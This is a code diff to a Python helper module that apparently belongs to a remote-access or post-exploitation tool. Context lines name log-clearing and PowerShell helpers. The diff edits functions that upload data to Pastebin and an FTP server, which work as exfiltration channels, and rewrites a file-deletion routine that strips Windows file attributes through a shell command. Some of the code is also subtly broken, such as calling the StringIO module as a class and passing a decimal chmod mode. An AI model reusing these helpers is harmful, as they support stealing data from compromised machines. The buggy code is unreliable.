@@ -239,38 +239,41 @@ def png(image):
     Returns raw image data in PNG format
 
     """
-    import numpy
-    import struct
-    import StringIO
-    if isinstance(image, numpy.ndarray):
-        width, height = (image.shape[1], image.shape[0])
-        data = image.tobytes()
-    elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
-        width, height = (image.width, image.height)
-        data = image.rgb
-    else:
-        raise TypeError("invalid input type: {}".format(type(image)))
-    line = width * 3
-    png_filter = struct.pack('>B', 0)
-    scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
-    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
-    ihdr = [b"", b'IHDR', b"", b""]
-    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
-    ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
-    ihdr[0] = struct.pack('>I', len(ihdr[2]))
-    idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
-    idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
-    idat[0] = struct.pack('>I', len(idat[2]))
-    iend = [b"", b'IEND', b"", b""]
-    iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
-    iend[0] = struct.pack('>I', len(iend[2]))
-    fileh = StringIO()
-    fileh.write(magic)
-    fileh.write(b"".join(ihdr))
-    fileh.write(b"".join(idat))
-    fileh.write(b"".join(iend))
-    fileh.seek(0)
-    return fileh
+    try:
+        import numpy
+        import struct
+        import StringIO
+        if isinstance(image, numpy.ndarray):
+            width, height = (image.shape[1], image.shape[0])
+            data = image.tobytes()
+        elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
+            width, height = (image.width, image.height)
+            data = image.rgb
+        else:
+            raise TypeError("invalid input type: {}".format(type(image)))
+        line = width * 3
+        png_filter = struct.pack('>B', 0)
+        scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
+        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+        ihdr = [b"", b'IHDR', b"", b""]
+        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+        ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
+        ihdr[0] = struct.pack('>I', len(ihdr[2]))
+        idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
+        idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
+        idat[0] = struct.pack('>I', len(idat[2]))
+        iend = [b"", b'IEND', b"", b""]
+        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
+        iend[0] = struct.pack('>I', len(iend[2]))
+        fileh = StringIO()
+        fileh.write(magic)
+        fileh.write(b"".join(ihdr))
+        fileh.write(b"".join(idat))
+        fileh.write(b"".join(iend))
+        fileh.seek(0)
+        return fileh
+    except Exception as e:
+        log(e)
 
 def delete(target):
     """ 
@@ -281,21 +284,16 @@ def delete(target):
 
     """
     import os
-    if os.path.isfile(target):
-        if os.name == 'nt':
-            import win32api
-            import win32con
-            try:
-                win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_NORMAL)
-            except: pass
-        else:
-            try:
-                os.chmod(target, 777)
-            except OSError: pass
-        os.remove(target)
-    elif os.path.isdir(target):
-        import shutil
-        shutil.rmtree(target, ignore_errors=True)
+    try:
+        _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
+    except OSError: pass
+    try:
+        if os.path.isfile(target):
+            os.remove(target)
+        elif os.path.isdir(target):
+            import shutil
+            shutil.rmtree(target, ignore_errors=True)
+    except OSError: pass
 
 def clear_system_logs():
     """ 
@@ -320,7 +318,10 @@ def kwargs(data):
     Returns dictionary of keyword arguments as key-value pairs
 
     """
-    return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
+    try:
+        return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
+    except Exception as e:
+        log(e)
 
 def powershell(code):
     """ 
@@ -388,7 +389,7 @@ def imgur(source, api_key=None):
     else:
         return "No Imgur API key found"
 
-def pastebin(source, api_dev_key, api_user_key=None):
+def pastebin(source, api_key):
     """ 
     Upload file/data to Pastebin
 
@@ -400,13 +401,12 @@ def pastebin(source, api_dev_key, api_user_key=None):
     :param str api_user_key:   Pastebin api_user_key
 
     """
-    import os
-    if api_dev_key:
-        info={'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_dev_key}
-        if api_user_key:
-            info.update({'api_user_key'  : api_user_key})
+    import urllib2
+    if api_key:
+        info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
         paste = post('https://pastebin.com/api/api_post.php', data=info)
-        return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
+        parts = urllib2.urlparse.urlsplit(paste)       
+        return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
     else:
         return "No Pastebin API key found"
 
@@ -427,6 +427,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     import os
     import time
     import ftplib
+    import StringIO
     if host and user and password:
         path  = ''
         local = time.ctime().split()
@@ -453,6 +454,8 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
             path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
         stor = ftp.storbinary('STOR ' + path, source)
         return path
+    else:
+        log(level='debug', info='missing one or more required arguments: host, user, password')
 
 def config(*arg, **options):
     """ 
@@ -487,23 +490,4 @@ def threaded(function):
         t.start()
         return t
     return _threaded
-
-@threaded
-def spinner(flag):
-    """ 
-    Asynchronous spinner loading animation
-
-    `Required`
-    :param flag:   threading.Event object
-
-    """
-    import sys
-    import itertools
-    import threading
-    spinner = itertools.cycle(['-', '/', '|', '\\'])
-    while not flag.is_set():
-        sys.stdout.write(next(spinner))
-        sys.stdout.flush()
-        flag.wait(0.2)
-        sys.stdout.write('\b')
-        sys.stdout.flush()    
+  
